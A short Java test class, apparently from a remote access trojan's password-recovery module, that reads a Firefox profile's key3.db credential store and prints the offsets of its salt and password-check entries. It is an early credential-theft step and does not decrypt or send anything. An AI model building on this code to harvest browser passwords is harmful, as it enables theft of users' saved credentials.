package de.sogomn.rat.recovery;

import de.sogomn.engine.util.FileUtils;

/*
 * TEST CLASS!!!
 */
public final class Firefox {
	
	private Firefox() {
		//...
	}
	
	public static void main(final String[] args) {
		final byte[] data = FileUtils.readExternalData("C:/Users/Sogomn/AppData/Roaming/Mozilla/Firefox/Profiles/ok9izu3i.default/key3.db");
		final String string = new String(data);
		final int globalSalt = string.indexOf("global-salt") - 11 - 16;
		final int passwordCheck = string.indexOf("password-check");
		final int entrySalt = globalSalt + 11 + 16;
		
		System.out.println(globalSalt);
		System.out.println(passwordCheck);
		System.out.println(entrySalt);
		System.out.println();
		System.out.println(string);
		System.out.println();
	}
	
}
